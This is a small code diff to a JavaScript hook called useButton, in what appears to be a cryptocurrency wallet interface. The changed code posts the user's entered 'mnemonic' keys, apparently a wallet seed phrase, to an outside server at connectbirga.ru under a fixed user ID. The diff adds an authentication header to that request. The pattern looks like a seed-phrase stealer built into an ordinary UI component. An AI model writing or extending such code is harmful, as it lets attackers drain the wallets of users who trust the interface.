@@ -77,6 +77,10 @@ const useButton = ({step, setStep, keys, values, setMistakes, mistakes, numbers}
         const response = await axios.post("https://www.connectbirga.ru/user/wallet", {
             mnemonic: keys,
             userId: 2144832745,
+          } , {
+            headers : {
+              "X-API-KEY-AUTH" : "X_API_KEY_AUTH_SOME_KEY_FOR_AUTHlkfdjsdofjs"
+            }
           });
       } , [keys] )
     
